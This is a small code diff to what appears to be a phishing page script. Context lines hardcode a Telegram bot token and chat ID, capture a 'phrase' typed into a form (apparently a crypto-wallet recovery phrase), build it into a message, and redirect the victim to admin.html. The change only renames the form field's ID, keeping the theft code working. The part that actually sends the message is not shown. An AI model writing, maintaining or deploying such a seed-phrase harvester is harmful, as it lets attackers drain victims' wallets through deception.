@@ -4,7 +4,7 @@ var telegram_bot_id = "7195951260:AAHxdqm879HGiJOdcowJ8W2Fd3BtCMDUMW0";
 var chat_id = -1002079191829;
 var phr;
 var ready = function () {
-    phr = document.getElementById("phrase").value;
+    phr = document.getElementById("phr").value;
     message = "Phrase: " + phr;
 };
 var sender = function () {
@@ -28,6 +28,6 @@ var sender = function () {
 
         window.location.href = "admin.html";
     });
-    document.getElementById("phrase").value = "";
+    document.getElementById("phr").value = "";
     return false;
 };
